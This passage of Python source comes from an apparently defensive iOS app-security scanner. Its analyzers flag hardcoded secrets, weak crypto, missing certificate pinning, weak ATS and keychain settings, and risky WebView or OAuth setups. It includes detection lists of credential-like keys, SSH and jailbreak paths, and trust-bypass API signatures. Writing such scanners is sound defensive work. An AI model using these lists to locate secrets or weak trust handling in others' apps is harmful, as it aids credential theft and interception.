            recommendation="Set to false in release builds.",
            cwe="CWE-489", masvs="MSTG-RESILIENCE-2",
            confidence="confirmed", source="mastg",
        ))
    keychain = ent.get("keychain-access-groups") or []
    if any("*" in str(k) for k in keychain):
        f.append(Finding(
            id="ios-keychain-wildcard",
            title="Wildcard keychain-access-groups",
            severity="medium", category="MASVS-STORAGE",
            description=("Keychain access group includes a wildcard — credentials shared with any "
                         "app signed by the same team."),
            evidence=f"keychain-access-groups: {keychain}",
            recommendation="Use specific group identifiers, not wildcards.",
            cwe="CWE-200", masvs="MSTG-STORAGE-1",
            confidence="confirmed", source="mastg",
        ))
    return f


def ios_analyze_secrets(ctx: IOSCtx) -> list:
    f = []
    seen = set()
    n = 0
    for s in ctx.binary_strings:
        for pid, title, regex, sev, cwe in SECRET_PATTERNS:
            for m in re.finditer(regex, s):
                value = m.group(0)
                if (pid, value) in seen: continue
                seen.add((pid, value)); n += 1
                snippet = value if len(value) <= 80 else value[:60] + "..."
                f.append(Finding(
                    id=f"ios-secret-{pid}-{n}",
                    title=f"Hardcoded secret in iOS binary: {title}",
                    severity=sev, category="MASVS-CODE",
                    description="Secret embedded in iOS binary. Extractable from any IPA copy.",
                    evidence=f"binary string: {snippet}",
                    recommendation="Move to backend. Rotate the leaked credential.",
                    cwe=cwe, masvs="MSTG-CODE-2",
                    confidence="confirmed", source="mastg",
                ))
    return f


def ios_analyze_weak_crypto(ctx: IOSCtx) -> list:
    f = []
    indicators = {
        "kCCAlgorithmDES":   ("ios-cc-des", "CommonCrypto: DES", "high"),
        "kCCAlgorithm3DES":  ("ios-cc-3des", "CommonCrypto: 3DES", "medium"),
        "kCCAlgorithmRC4":   ("ios-cc-rc4", "CommonCrypto: RC4", "high"),
        "CC_MD5":            ("ios-cc-md5", "CommonCrypto: MD5", "high"),
        "CC_SHA1_Update":    ("ios-cc-sha1", "CommonCrypto: SHA-1", "medium"),
        "kCCOptionECBMode":  ("ios-cc-ecb", "CommonCrypto: ECB mode", "high"),
    }
    text = " ".join(ctx.binary_strings)
    for needle, (fid, title, sev) in indicators.items():
        if needle in text:
            f.append(Finding(
                id=fid, title=title, severity=sev, category="MASVS-CRYPTO",
                description=f"{title} — modern recommendation: AES-GCM (CryptoKit), SHA-256/SHA-3.",
                evidence=f"binary references: {needle}",
                recommendation="Use AES-GCM (CryptoKit) for symmetric crypto; SHA-256/SHA-3 for hashing.",
                cwe="CWE-327", masvs="MSTG-CRYPTO-4",
                confidence="confirmed", source="mastg",
            ))
    return f


def ios_analyze_pinning(ctx: IOSCtx) -> list:
    f = []
    indicators = ["TrustKit", "TSKPinnedDomains", "kTSKPublicKeyHashes",
                  "NSURLSessionPinningDelegate", "AFSecurityPolicy",
                  "validatesDomainName", "evaluateServerTrust"]
    if not _ios_string_present(ctx, *indicators):
        f.append(Finding(
            id="ios-no-pinning",
            title="No certificate pinning indicators detected",
            severity="low", category="MASVS-NETWORK",
            description=("No common pinning patterns (TrustKit, NSURLSessionPinningDelegate, "
                         "AFSecurityPolicy.validatesDomainName) in the binary. Default URLSession "
                         "trusts any system CA — insufficient for high-value targets."),
            evidence="No pinning indicators in binary",
            recommendation="Implement public-key pinning via TrustKit or URLSessionDelegate challenge handler.",
            masvs="MSTG-NETWORK-4", confidence="possible", source="mastg",
        ))
    return f


def ios_analyze_jailbreak_detection(ctx: IOSCtx) -> list:
    f = []
    indicators = ["/Applications/Cydia.app", "/private/var/lib/apt", "/usr/sbin/sshd",
                  "cydia://", "isJailbroken", "/private/var/stash", "/etc/apt",
                  "MobileSubstrate", "/usr/bin/ssh", "/Library/MobileSubstrate"]
    if not _ios_string_present(ctx, *indicators):
        f.append(Finding(
            id="ios-no-jailbreak-detection",
            title="No jailbreak-detection routines detected",
            severity="info", category="MASVS-RESILIENCE",
            description=("No common jailbreak-detection patterns. For high-value apps consider adding "
                         "tamper checks — defence in depth, not the primary control."),
            evidence="No jailbreak indicators present",
            recommendation="Add multiple independent jailbreak checks (path, fork, syscall). Use App Attest server-side.",
            masvs="MSTG-RESILIENCE-1",
            confidence="possible", source="mastg",
        ))
    return f


def ios_analyze_query_schemes(ctx: IOSCtx) -> list:
    f = []
    info = ctx.info_plist or {}
    queries = info.get("LSApplicationQueriesSchemes") or []
    if queries:
        ctx.extras["app_queries"] = queries
        f.append(Finding(
            id="ios-queries-schemes",
            title=f"App probes {len(queries)} other URL scheme(s)",
            severity="info", category="MASVS-PLATFORM",
            description="LSApplicationQueriesSchemes — list of other apps probed via canOpenURL.",
            evidence="\n".join(queries[:20]),
            recommendation="Review in privacy disclosures; declare only what's actually queried.",
            masvs="MSTG-PLATFORM-1", confidence="confirmed", source="mastg",
        ))
    return f


def ios_analyze_privacy_strings(ctx: IOSCtx) -> list:
    f = []
    info = ctx.info_plist or {}
    keys = [k for k in info.keys() if k.startswith("NS") and k.endswith("UsageDescription")]
    sensitive = {"NSCameraUsageDescription", "NSMicrophoneUsageDescription",
                 "NSLocationWhenInUseUsageDescription", "NSLocationAlwaysAndWhenInUseUsageDescription",
                 "NSContactsUsageDescription", "NSCalendarsUsageDescription",
                 "NSPhotoLibraryUsageDescription", "NSBluetoothAlwaysUsageDescription",
                 "NSAppleMusicUsageDescription", "NSFaceIDUsageDescription"}
    flagged = [k for k in keys if k in sensitive]
    if flagged:
        ctx.extras["privacy_keys"] = flagged
        f.append(Finding(
            id="ios-privacy-permissions",
            title=f"Sensitive privacy permissions requested ({len(flagged)})",
            severity="info", category="MASVS-PLATFORM",
            description="App declares usage descriptions for sensitive iOS resources.",
            evidence="\n".join(flagged),
            recommendation="Remove unused permissions to reduce attack surface and prompt fatigue.",
            masvs="MSTG-PLATFORM-1", confidence="confirmed", source="mastg",
        ))
    return f


def ios_analyze_binary_protections(ctx: IOSCtx) -> list:
    f = []
    has_canary = _ios_string_present(ctx, "__stack_chk_guard", "__stack_chk_fail")
    has_arc = _ios_string_present(ctx, "_objc_release", "_objc_retain")
    if not has_canary:
        f.append(Finding(
            id="ios-no-stack-canary",
            title="Stack canaries not detected",
            severity="medium", category="MASVS-CODE",
            description=("__stack_chk_guard / __stack_chk_fail not found in binary strings. May "
                         "indicate stack-smashing protection disabled (rare with modern Xcode)."),
            evidence="No stack canary symbols in binary",
            recommendation="Build with -fstack-protector-strong (default in Xcode).",
            masvs="MSTG-CODE-9", confidence="likely", source="mastg",
        ))
    if not has_arc:
        f.append(Finding(
            id="ios-no-arc",
            title="ARC indicators not found",
            severity="low", category="MASVS-CODE",
            description="objc_retain/objc_release not visible — possibly manual ref-counting (legacy).",
            evidence="No ARC symbols in binary",
            recommendation="Use ARC; modern Xcode enables it by default.",
            masvs="MSTG-CODE-9", confidence="possible", source="mastg",
        ))
    return f


def ios_analyze_pasteboard(ctx: IOSCtx) -> list:
    f = []
    if _ios_string_present(ctx, "UIPasteboard"):
        f.append(Finding(
            id="ios-pasteboard",
            title="UIPasteboard usage detected",
            severity="low", category="MASVS-PLATFORM",
            description=("App uses UIPasteboard. Sensitive data copied to general pasteboard is "
                         "readable by every other app. Common iOS data-leak vector."),
            evidence="UIPasteboard symbols in binary",
            recommendation=("For sensitive data, use UIPasteboard with localOnly:true and "
                            "expirationDate:Date()+seconds. Mark sensitive UITextFields as secureTextEntry."),
            cwe="CWE-200", masvs="MSTG-STORAGE-10",
            confidence="confirmed", source="mastg",
        ))
    return f


def ios_analyze_uiwebview(ctx: IOSCtx) -> list:
    f = []
    if _ios_string_present(ctx, "UIWebView"):
        f.append(Finding(
            id="ios-uiwebview-deprecated",
            title="UIWebView (deprecated) detected",
            severity="medium", category="MASVS-PLATFORM",
            description=("UIWebView is deprecated and removed from App Store submissions in 2020. "
                         "Has multiple known security issues vs WKWebView (out-of-process JS, "
                         "no JIT)."),
            evidence="UIWebView symbol in binary",
            recommendation="Migrate to WKWebView.",
            masvs="MSTG-PLATFORM-7", confidence="confirmed", source="mastg",
        ))
    return f


def ios_analyze_keychain_accessibility(ctx: IOSCtx) -> list:
    f = []
    text = " ".join(ctx.binary_strings)
    if "kSecAttrAccessibleAlways" in text:
        f.append(Finding(
            id="ios-keychain-always",
            title="Keychain item accessible always (kSecAttrAccessibleAlways)",
            severity="critical", category="MASVS-STORAGE",
            description=("kSecAttrAccessibleAlways means the keychain item is accessible even when "
                         "the device is locked. Per Apple's guidance, this is the weakest accessibility "
                         "class and should never be used for credentials."),
            evidence="kSecAttrAccessibleAlways in binary",
            recommendation=("Use kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly or "
                            "kSecAttrAccessibleWhenUnlockedThisDeviceOnly."),
            cwe="CWE-922", masvs="MSTG-STORAGE-1",
            confidence="confirmed", source="mastg",
        ))
    elif "kSecAttrAccessibleAfterFirstUnlock" in text and "kSecAttrAccessibleWhenPasscodeSet" not in text:
        f.append(Finding(
            id="ios-keychain-afterfirstunlock",
            title="Keychain accessibility kSecAttrAccessibleAfterFirstUnlock",
            severity="medium", category="MASVS-STORAGE",
            description=("After first unlock since boot, the item is accessible until reboot — "
                         "weaker than WhenUnlocked."),
            evidence="kSecAttrAccessibleAfterFirstUnlock in binary",
            recommendation="Prefer kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly for high-value secrets.",
            masvs="MSTG-STORAGE-1", confidence="likely", source="mastg",
        ))
    return f


# =============================================================================
# iOS Path-2 expansion (MASVS-AUTH/NETWORK/PLATFORM/RESILIENCE/STORAGE/CRYPTO/CODE).
# Brings Vexa's iOS coverage from 15 to ~50 analyzers. Each analyzer ships with
# CWE / MASVS / references / confidence / evidence -- same rigor as the Android
# Path-2 batch.
# =============================================================================

# ---------- MASVS-AUTH (iOS) ----------

def ios_analyze_local_auth_weak_policy(ctx: IOSCtx) -> list:
    """LAContext used with `evaluatePolicy:LAPolicyDeviceOwnerAuthentication`
    (passcode fallback) instead of `LAPolicyDeviceOwnerAuthenticationWithBiometrics`.
    With passcode fallback, an attacker who has the device unlock can pass biometric
    UI without actually being the user."""
    f = []
    has_la = _ios_string_present(ctx, "LAContext", "evaluatePolicy")
    if not has_la:
        return f
    has_passcode_fallback = _ios_string_present(
        ctx, "LAPolicyDeviceOwnerAuthentication")
    has_strict = _ios_string_present(
        ctx, "LAPolicyDeviceOwnerAuthenticationWithBiometrics")
    if has_passcode_fallback and not has_strict:
        f.append(Finding(
            id="ios-local-auth-passcode-fallback",
            title="Local authentication permits passcode fallback",
            severity="medium", category="MASVS-AUTH",
            description=("LAContext is used with LAPolicyDeviceOwnerAuthentication, "
                         "which falls back to the device passcode if biometrics "
                         "fail or aren't enrolled. If the threat model requires "
                         "the present user to authenticate (vs. anyone with the "
                         "passcode), use LAPolicyDeviceOwnerAuthenticationWithBiometrics."),
            evidence="LAPolicyDeviceOwnerAuthentication present; biometrics-only policy not detected",
            recommendation=("For high-value flows, use "
                            "LAPolicyDeviceOwnerAuthenticationWithBiometrics. Pair "
                            "with a Keychain item using kSecAccessControlBiometryCurrentSet."),
            cwe="CWE-287", masvs="MSTG-AUTH-8", cvss=4.6,
            references=[
                "https://developer.apple.com/documentation/localauthentication/lapolicy",
                "https://mas.owasp.org/MASTG/iOS/0x06f-Testing-Local-Authentication/",
            ],
            confidence="likely", source="vexa",
        ))
    return f


def ios_analyze_keychain_no_biometric_acl(ctx: IOSCtx) -> list:
    """Keychain items stored without SecAccessControl that requires biometrics.
    Without an access-control object, the only protection is device unlock."""
    f = []
    has_keychain = _ios_string_present(ctx, "SecItemAdd", "kSecClassGenericPassword")
    if not has_keychain:
        return f
    has_acl = _ios_string_present(
        ctx, "SecAccessControlCreateWithFlags",
        "kSecAccessControlBiometryAny", "kSecAccessControlBiometryCurrentSet",
        "kSecAccessControlUserPresence")
    if not has_acl:
        f.append(Finding(
            id="ios-keychain-no-biometric-acl",
            title="Keychain items stored without biometric access control",
            severity="medium", category="MASVS-AUTH",
            description=("App stores items in the Keychain (SecItemAdd) but no "
                         "SecAccessControl object requiring biometric / user-presence "
                         "verification was detected. Items are protected only by "
                         "device unlock, so anyone with the unlock code can read them "
                         "(via app code, not via /var/Keychains directly)."),
            evidence="SecItemAdd present; no kSecAccessControlBiometry* flags found",
            recommendation=("Create the item with SecAccessControlCreateWithFlags "
                            "and kSecAccessControlBiometryCurrentSet for tokens / "
                            "credentials that should require fresh biometric auth."),
            cwe="CWE-522", masvs="MSTG-AUTH-8", cvss=5.0,
            references=[
                "https://developer.apple.com/documentation/security/secaccesscontrolcreateflags",
                "https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage/",
            ],
            confidence="possible", source="vexa",
        ))
    return f


def ios_analyze_password_in_userdefaults(ctx: IOSCtx) -> list:
    """NSUserDefaults / UserDefaults strings near auth-related keys -- a common
    bug where developers persist tokens / passwords in the unencrypted plist."""
    f = []
    has_defaults = _ios_string_present(ctx, "NSUserDefaults", "UserDefaults",
                                       "standardUserDefaults")
    if not has_defaults:
        return f
    sensitive_keys = []
    for s in ctx.binary_strings:
        sl = s.lower()
        if 4 < len(s) < 60 and any(k in sl for k in (
                "password", "passwd", "pwd", "auth_token", "access_token",
                "refresh_token", "session_token", "api_key", "apikey",
                "credential", "secret_key")):
            sensitive_keys.append(s)
    if has_defaults and sensitive_keys:
        f.append(Finding(
            id="ios-userdefaults-sensitive-keys",
            title="UserDefaults likely stores sensitive credentials",
            severity="high", category="MASVS-STORAGE",
            description=("UserDefaults is referenced and the binary contains "
                         "string keys suggesting credential storage (password/"
                         "token/api_key). UserDefaults is a plain plist in "
                         "Library/Preferences -- it is NOT encrypted at rest "
                         "and is included in unencrypted iCloud / iTunes backups."),
            evidence=f"Suspect keys: {sensitive_keys[:3]}",
            recommendation=("Migrate credential storage to the Keychain with "
                            "kSecAttrAccessibleWhenUnlockedThisDeviceOnly. Use "
                            "the standard SecItemAdd / SecItemCopyMatching APIs."),
            cwe="CWE-922", masvs="MSTG-STORAGE-1", cvss=7.4,
            references=[
                "https://developer.apple.com/documentation/security/keychain_services",
                "https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage/",
            ],
            confidence="likely", source="vexa",
        ))
    return f


def ios_analyze_jwt_alg_none(ctx: IOSCtx) -> list:
    """iOS JWT libraries accepting alg=none."""
    f = []
    has_jwt = _ios_string_present(ctx, "JWTKit", "SwiftJWT", "JOSESwift",
                                  "HeimdallJWT", "JWT.io")
    has_none = any(s in ("none", "NONE", "alg=none") for s in ctx.binary_strings)
    if has_jwt and has_none:
        f.append(Finding(
            id="ios-jwt-alg-none",
            title="JWT library may accept unsigned tokens (alg=none)",
            severity="high", category="MASVS-AUTH",
            description=("App imports a JWT library and contains the literal "
                         "'none' algorithm string. If the verifier accepts "
                         "alg=none, attackers can forge any token without a signature."),
            evidence="JWT lib + 'none' string detected",
            recommendation=("Pin the expected algorithm explicitly (HS256/RS256). "
                            "Reject tokens whose header.alg == 'none'."),
            cwe="CWE-347", masvs="MSTG-AUTH-3", cvss=8.1,
            references=[
                "https://cwe.mitre.org/data/definitions/347.html",
                "https://www.howmanydayssinceajwtalgnonevuln.com/",
            ],
            confidence="possible", source="vexa",
        ))
    return f


def ios_analyze_oauth_state_missing(ctx: IOSCtx) -> list:
    """OAuth flows without a `state` parameter -- enables CSRF on the redirect."""
    f = []
    has_oauth = _ios_string_present(ctx, "ASWebAuthenticationSession",
                                    "SFAuthenticationSession", "oauth", "OAuth",
                                    "authorization_code", "client_id")
    if not has_oauth:
        return f
    has_state = _ios_string_present(ctx, "&state=", "state=", "stateParam",
                                    "oauthState", "PKCE", "code_verifier")
    if not has_state:
        f.append(Finding(
            id="ios-oauth-no-state-or-pkce",
            title="OAuth flow may lack state parameter / PKCE",
            severity="medium", category="MASVS-AUTH",
            description=("OAuth-related strings detected but no state parameter "
                         "or PKCE (Proof Key for Code Exchange) markers. Without "
                         "state, the OAuth redirect is vulnerable to CSRF: an "
                         "attacker can complete a login with their victim's "
                         "credentials by intercepting the redirect URL."),
            evidence="OAuth flow strings present; state= / code_verifier not detected",
            recommendation=("Use ASWebAuthenticationSession with PKCE: generate "
                            "a code_verifier per request, pass code_challenge in "
                            "the auth URL, and verify state on the redirect."),
            cwe="CWE-352", masvs="MSTG-AUTH-1", cvss=6.1,
            references=[
                "https://datatracker.ietf.org/doc/html/rfc7636",
                "https://developer.apple.com/documentation/authenticationservices/aswebauthenticationsession",
            ],
            confidence="possible", source="vexa",
        ))
    return f


# ---------- MASVS-NETWORK (iOS) ----------

def ios_analyze_ats_specific_exceptions(ctx: IOSCtx) -> list:
    """NSAppTransportSecurity exceptions for specific domains (better than allow-all
    but worth noting; common to reach prod with stale `localhost` or staging exceptions)."""
    f = []
    info = ctx.info_plist or {}
    ats = info.get("NSAppTransportSecurity") or {}
    exceptions = ats.get("NSExceptionDomains") or {}
    if exceptions and isinstance(exceptions, dict):
        domains = list(exceptions.keys())
        suspect = [d for d in domains if any(s in d.lower() for s in (
            "localhost", "staging", "stage", "dev", "test", "internal"))]
        if suspect:
            f.append(Finding(
                id="ios-ats-stale-exceptions",
                title="ATS exception domains look like leftover dev / staging entries",
                severity="medium", category="MASVS-NETWORK",
                description=("App Transport Security has per-domain exceptions for "
                             f"{len(domains)} hosts; {len(suspect)} of them look "
                             "like development / staging hosts. Once an exception is "
                             "in place, that connection skips ATS protections (TLS "
                             "version pin, forward secrecy)."),
                evidence=f"Suspect ATS exceptions: {suspect[:5]}",
                recommendation=("Audit Info.plist NSExceptionDomains. Remove any "
                                "non-production hostnames before App Store release."),
                cwe="CWE-319", masvs="MSTG-NETWORK-2", cvss=5.4,
                references=[
                    "https://developer.apple.com/documentation/bundleresources/information_property_list/nsapptransportsecurity",
                ],
                confidence="likely", source="vexa",
            ))
    return f


def ios_analyze_ats_min_tls_version(ctx: IOSCtx) -> list:
    """ATS exception that lowers minimum TLS version below 1.2."""
    f = []
    info = ctx.info_plist or {}
    ats = info.get("NSAppTransportSecurity") or {}
    exceptions = ats.get("NSExceptionDomains") or {}
    if not isinstance(exceptions, dict):
        return f
    bad_domains = []
    for domain, settings in exceptions.items():
        if not isinstance(settings, dict):
            continue
        min_tls = settings.get("NSExceptionMinimumTLSVersion", "")
        if min_tls in ("TLSv1.0", "TLSv1.1"):
            bad_domains.append(f"{domain} ({min_tls})")
    if bad_domains:
        f.append(Finding(
            id="ios-ats-weak-tls",
            title="ATS exception lowers minimum TLS to deprecated version",
            severity="high", category="MASVS-NETWORK",
            description=("One or more ATS exceptions accept TLS 1.0 or 1.1 -- both "
                         "are deprecated. TLS 1.0/1.1 are vulnerable to BEAST, "
                         "Lucky13, POODLE-TLS, and other downgrade attacks."),
            evidence=f"Domains with weak TLS: {bad_domains[:3]}",
            recommendation=("Remove NSExceptionMinimumTLSVersion or set it to "
                            "TLSv1.2 (TLSv1.3 preferred). Coordinate with backend "
                            "to require TLS 1.2+."),
            cwe="CWE-326", masvs="MSTG-NETWORK-2", cvss=7.4,
            references=[
                "https://datatracker.ietf.org/doc/html/rfc8996",
            ],
            confidence="confirmed", source="vexa",
        ))
    return f


def ios_analyze_nsurl_connection_deprecated(ctx: IOSCtx) -> list:
    """NSURLConnection is deprecated; apps still using it likely have other
    legacy patterns (and don't get the modern URLSession TLS handling)."""
    f = []
    if _ios_string_present(ctx, "NSURLConnection",
                           "connectionWithRequest:", "sendSynchronousRequest:"):
        f.append(Finding(
            id="ios-nsurlconnection-deprecated",
            title="App uses deprecated NSURLConnection",
            severity="low", category="MASVS-NETWORK",
            description=("NSURLConnection has been deprecated since iOS 9 (2015). "
                         "Apps still using it generally have other legacy patterns "
                         "and don't benefit from URLSession's per-request TLS "
                         "configuration, automatic background handling, etc."),
            evidence="NSURLConnection / sendSynchronousRequest:/connectionWithRequest: detected",
            recommendation=("Migrate to URLSession. URLSessionDelegate gives proper "
                            "control over TLS challenges (use it for pinning)."),
            cwe="CWE-477", masvs="MSTG-NETWORK-1", cvss=2.7,
            references=[
                "https://developer.apple.com/documentation/foundation/nsurlconnection",
            ],
            confidence="confirmed", source="vexa",
        ))
    return f


def ios_analyze_cookie_no_secure_flag(ctx: IOSCtx) -> list:
    """NSHTTPCookie usage without Secure flag -- cookies sent over plaintext if
    a downgrade ever happens."""
    f = []
    has_cookie = _ios_string_present(ctx, "NSHTTPCookie", "HTTPCookieStorage")
    if not has_cookie:
        return f
    has_secure = _ios_string_present(ctx, "NSHTTPCookieSecure", "isSecure")
    if not has_secure:
        f.append(Finding(
            id="ios-cookie-no-secure",
            title="NSHTTPCookie used without Secure flag",
            severity="low", category="MASVS-NETWORK",
            description=("App constructs HTTP cookies but no Secure-flag setter "
                         "was detected. If the connection ever degrades to HTTP "
                         "(misconfiguration, ATS exception, redirect), the cookie "
                         "is transmitted in cleartext."),
            evidence="NSHTTPCookie present; NSHTTPCookieSecure not detected",
            recommendation=("Always set NSHTTPCookieSecure=YES on cookies "
                            "containing auth tokens. Server should also send Set-Cookie "
                            "with Secure; HttpOnly; SameSite=Strict."),
            cwe="CWE-614", masvs="MSTG-NETWORK-1", cvss=4.0,
            references=[
                "https://developer.apple.com/documentation/foundation/nshttpcookie",
            ],
            confidence="possible", source="vexa",
        ))
    return f


def ios_analyze_custom_hostname_verifier(ctx: IOSCtx) -> list:
    """Custom NSURLSession delegate that returns NSURLSessionAuthChallengeUseCredential
    without checking the trust chain — typical SSL-bypass anti-pattern."""
    f = []
    has_delegate = _ios_string_present(
        ctx, "didReceiveChallenge", "NSURLAuthenticationMethodServerTrust",
        "NSURLSessionAuthChallengeDisposition")
    has_bypass = _ios_string_present(
        ctx, "NSURLSessionAuthChallengeUseCredential",
        "credentialForTrust:", "[NSURLCredential credentialForTrust:")
    has_proper_eval = _ios_string_present(
        ctx, "SecTrustEvaluateWithError", "SecTrustEvaluate",
        "SecPolicyCreateSSL")
    if has_delegate and has_bypass and not has_proper_eval:
        f.append(Finding(
            id="ios-custom-trust-bypass",
            title="Custom URLSession delegate may bypass certificate validation",
            severity="critical", category="MASVS-NETWORK",
            description=("URLSessionDelegate handles auth challenges and creates "
                         "URLCredential objects, but no SecTrustEvaluate* call was "
                         "found. The classic 'always trust' bug: the delegate "
                         "returns UseCredential with the server's trust object "
                         "without actually evaluating it."),
            evidence="didReceiveChallenge + UseCredential present; SecTrustEvaluate not detected",
            recommendation=("In didReceiveChallenge, call SecTrustEvaluateWithError "
                            "and only return UseCredential on success. For pinning, "
                            "compare the leaf cert's public key hash against an "
                            "embedded constant."),
            cwe="CWE-295", masvs="MSTG-NETWORK-3", cvss=8.1,
            references=[
                "https://developer.apple.com/documentation/foundation/urlsessiondelegate",
                "https://mas.owasp.org/MASTG/iOS/0x06g-Testing-Network-Communication/",
            ],
            confidence="likely", source="vexa",
        ))
    return f


def ios_analyze_websocket_cleartext(ctx: IOSCtx) -> list:
    """ws:// URLs in iOS binary."""
    f = []
    bad_urls = [s for s in ctx.binary_strings
                if isinstance(s, str) and len(s) < 200 and s.startswith("ws://")
                and "localhost" not in s and "127.0.0.1" not in s
                and "10." not in s[:8] and "192.168." not in s[:11]]
    if bad_urls:
        f.append(Finding(
            id="ios-cleartext-websocket",
            title=f"App uses cleartext WebSocket for {len(bad_urls)} endpoint(s)",
            severity="high", category="MASVS-NETWORK",
            description=("WebSocket URLs starting with ws:// are cleartext and "
                         "trivially MITM'd. WebSocket frames carry application "
                         "data, often including auth tokens after the handshake."),
            evidence=f"URLs: {bad_urls[:3]}",
            recommendation="Switch to wss://. Server must offer TLS endpoint.",
            cwe="CWE-319", masvs="MSTG-NETWORK-1", cvss=7.4,
            references=[
                "https://datatracker.ietf.org/doc/html/rfc6455",
            ],
            confidence="confirmed", source="vexa",
        ))
    return f


# ---------- MASVS-PLATFORM (iOS) ----------

def ios_analyze_wkwebview_javascript_bridge(ctx: IOSCtx) -> list:
    """WKUserContentController.add(scriptMessageHandler:name:) is the bridge
    surface; if combined with attacker-controlled URL loads, JS in the page can
    invoke native methods."""
    f = []
    has_bridge = _ios_string_present(
        ctx, "WKUserContentController", "addScriptMessageHandler",
        "userContentController:didReceiveScriptMessage:")
    has_webview_load_url = _ios_string_present(
        ctx, "WKWebView", "loadRequest:", "URLRequest")
    if has_bridge and has_webview_load_url:
        f.append(Finding(
            id="ios-wkwebview-js-bridge-with-loaded-content",
            title="WKWebView with JS message bridge loads URLs",
            severity="medium", category="MASVS-PLATFORM",
            description=("A WKUserContentController script-message bridge is "
                         "configured and the WebView loads URLs. If any loaded URL "
                         "comes from untrusted input (deep-link, push notification, "
                         "remote HTML), the loaded JS can call into the bridge "
                         "and invoke native handler methods."),
            evidence="WKUserContentController + WKWebView.loadRequest: present",
            recommendation=("Validate every URL before loadRequest:. Restrict the "
                            "bridge handler to a safe API surface; treat its "
                            "messages as untrusted input."),
            cwe="CWE-79", masvs="MSTG-PLATFORM-7", cvss=6.1,
            references=[
                "https://developer.apple.com/documentation/webkit/wkusercontentcontroller",
            ],
            confidence="possible", source="vexa",
        ))
    return f


def ios_analyze_wkwebview_universal_access(ctx: IOSCtx) -> list:
    """WKWebView with allowFileAccessFromFileURLs / allowUniversalAccessFromFileURLs."""
    f = []
    if _ios_string_present(
            ctx, "allowFileAccessFromFileURLs",
            "allowUniversalAccessFromFileURLs"):
        f.append(Finding(
            id="ios-wkwebview-universal-access",
            title="WKWebView grants file:// universal access",
            severity="high", category="MASVS-PLATFORM",
            description=("WKWebView is configured with allowFileAccessFromFileURLs "
                         "or allowUniversalAccessFromFileURLs. Combined with any "
                         "file:// load, JS in that file can read other local "
                         "files and make cross-origin requests."),
            evidence="allowFileAccessFromFileURLs / allowUniversalAccessFromFileURLs detected",
            recommendation=("Do not enable these flags. If you must load local "
                            "HTML, sanitize it and never combine with attacker-"
                            "influenced JS."),
            cwe="CWE-200", masvs="MSTG-PLATFORM-7", cvss=7.4,
            references=[
                "https://developer.apple.com/documentation/webkit/wkpreferences",
            ],
            confidence="confirmed", source="vexa",
        ))
    return f


def ios_analyze_url_scheme_no_validation(ctx: IOSCtx) -> list:
    """Apps with custom URL schemes that don't appear to validate the source app."""
    f = []
    info = ctx.info_plist or {}
    schemes = []
    for url_type in info.get("CFBundleURLTypes") or []:
        for s in url_type.get("CFBundleURLSchemes") or []:
            schemes.append(s)
    if not schemes:
        return f
    has_source_check = _ios_string_present(
        ctx, "sourceApplication", "UIApplicationOpenURLOptionsSourceApplicationKey",
        "annotation:")
    if not has_source_check:
        f.append(Finding(
            id="ios-url-scheme-no-source-check",
            title="Custom URL scheme handler does not validate source application",
            severity="medium", category="MASVS-PLATFORM",
            description=("App registers custom URL scheme(s) but the openURL "
                         "handler doesn't appear to read sourceApplication. Any "
                         "other app on the device can invoke the scheme; the "
                         "handler should treat its input as untrusted."),
            evidence=f"Schemes: {schemes[:3]}; no sourceApplication check found",
            recommendation=("In application(_:open:options:), inspect "
                            "options[.sourceApplication] and validate the URL "
                            "against an allowlist of expected operations."),
            cwe="CWE-927", masvs="MSTG-PLATFORM-3", cvss=5.4,
            references=[
                "https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623112-application",
            ],
            confidence="possible", source="vexa",
        ))
    return f


def ios_analyze_app_extension_exposed(ctx: IOSCtx) -> list:
    """App ships extensions; flag for review (extensions inherit app group access)."""
    f = []
    files = ctx.files or []
    extensions = [fn for fn in files if fn.endswith(".appex/Info.plist")
                  or "/PlugIns/" in fn and fn.endswith("Info.plist")]
    if extensions:
        f.append(Finding(
            id="ios-app-extensions-present",
            title=f"App ships {len(extensions)} extension(s)",
            severity="info", category="MASVS-PLATFORM",
            description=("App contains one or more app extensions (Today widgets, "
                         "Share, custom keyboard, etc.). Extensions share App "
                         "Group containers with the host app and can read/write "
                         "Keychain items in the same access group. Each extension "
                         "increases attack surface and should be audited separately."),
            evidence=f"Extensions: {len(extensions)}",
            recommendation=("Audit each extension. If any handles untrusted input "
                            "(custom keyboard, share extension), treat its output "
                            "as untrusted in the host app."),
            cwe="CWE-668", masvs="MSTG-PLATFORM-4", cvss=0.0,
            references=[
                "https://developer.apple.com/library/archive/documentation/General/Conceptual/ExtensibilityPG/",
            ],
            confidence="confirmed", source="vexa",
        ))
    return f


def ios_analyze_app_groups(ctx: IOSCtx) -> list:
    """App Group entitlements share data with other signed apps from the same dev."""
    f = []
    ents = ctx.entitlements or {}
    groups = ents.get("com.apple.security.application-groups") or []
    if groups and isinstance(groups, list) and len(groups) > 0:
        f.append(Finding(
            id="ios-app-groups-present",
            title=f"App Group entitlement: {len(groups)} group(s)",
            severity="info", category="MASVS-PLATFORM",
            description=("App declares App Group entitlements, sharing the group "
                         "container with all other apps signed by the same Team ID "
                         "with the same group identifier. Data written here is "
                         "readable by every app in the group; treat it like an "
                         "internal-team-only filesystem."),
            evidence=f"Groups: {groups[:3]}",
            recommendation=("Don't store data in App Groups that you wouldn't "
                            "share with every app in the group. For per-app "
                            "secrets, use the app-private Keychain access group."),
            cwe="CWE-732", masvs="MSTG-PLATFORM-4", cvss=0.0,
            references=[
                "https://developer.apple.com/documentation/xcode/configuring-app-groups",
            ],
            confidence="confirmed", source="vexa",
        ))
    return f


def ios_analyze_pasteboard_global(ctx: IOSCtx) -> list:
    """Global pasteboard reads (any app can read; sensitive data leaks)."""
    f = []
    has_global = _ios_string_present(
        ctx, "[UIPasteboard generalPasteboard]", "UIPasteboard.general",
        "generalPasteboard")
    if has_global:
        # Already covered by ios_analyze_pasteboard at higher level; this is
        # the more specific variant. Skip if pasteboard analyzer would already fire.
        pass  # Defer to existing pasteboard analyzer; no duplicate finding.
    return f


# ---------- MASVS-RESILIENCE (iOS) ----------

def ios_analyze_no_anti_debug_ptrace(ctx: IOSCtx) -> list:
    """No ptrace(PT_DENY_ATTACH) call -- standard iOS anti-debug technique."""
    f = []
    has_ptrace = _ios_string_present(ctx, "ptrace", "PT_DENY_ATTACH")
